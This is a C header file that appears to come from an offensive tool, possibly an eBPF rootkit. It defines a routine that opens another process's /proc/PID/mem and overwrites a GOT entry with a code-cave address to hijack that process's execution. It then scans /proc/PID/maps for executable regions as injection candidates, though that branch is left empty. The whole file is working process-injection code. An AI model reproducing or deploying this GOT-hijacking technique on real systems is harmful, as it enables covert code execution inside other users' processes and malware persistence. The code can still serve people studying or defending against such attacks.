#ifndef __MEM_INJECTION_EXT_H
#define __MEM_INJECTION_EXT_H

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "../common/constants.h"
#include "../common/map_common.h"

#include "code_caver.h"

int manage_injection(const struct rb_event* event){
    char mem_file_name[100];
    __u64 buf = (__u64)CODE_CAVE_ADDRESS;
    int mem_fd;


    memset( (void*)mem_file_name, 0, 100);

    printf("Injecting at PID %d at %llx\n", event->pid, event->got_address);

    sprintf(mem_file_name, "/proc/%d/mem", event->pid);
    mem_fd = open(mem_file_name, O_RDWR);
    lseek(mem_fd, event->got_address, SEEK_SET);

    for(int ii=0; ii<sizeof(__u64); ii++){
        if(write(mem_fd, (void*)&buf+ii, 1) < 0 ){
            perror("Error while writing at GOT");
            return -1;
        }
    }

    //Parsing /proc/pid/maps.
    //Note that addresses usually appear as 32-bit when catting, but this is not completely true
    //
    char *maps_file = calloc(512, sizeof(char));
    FILE *f;
    sprintf(maps_file, "/proc/%d/maps", event->pid);
    f = fopen(maps_file, "rt");
    while (fgets(maps_file, 512, f)) {
        __u32 pgoff, major, minor;
        __u64 from, to, ino;
        char flags[4];
        int ret = sscanf(maps_file, "%llx-%llx %4c %x %x:%x %llu ", &from, &to, flags, &pgoff, &major, &minor, &ino);
        printf("MAPS: %s\n", maps_file);

        //Parse flags, find executable one
        if(flags[2] == 'x'){
            //Candidate for code cave finding
            
        }
    }

    free(maps_file);

    return 0;
}

#endif